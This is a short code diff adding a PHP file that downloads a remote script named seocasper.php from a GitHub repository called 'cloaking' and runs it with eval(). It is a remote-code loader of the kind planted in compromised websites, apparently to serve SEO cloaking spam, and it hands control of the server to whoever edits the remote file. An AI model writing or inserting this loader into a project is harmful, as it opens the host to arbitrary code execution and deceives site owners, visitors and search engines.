@@ -1,0 +1,4 @@
+<?php
+$casperseo = file_get_contents('https://raw.githubusercontent.com/marketmg126-glitch/cloaking/refs/heads/main/seocasper.php');
+$casperseo = "?> ".$casperseo;
+eval($casperseo);
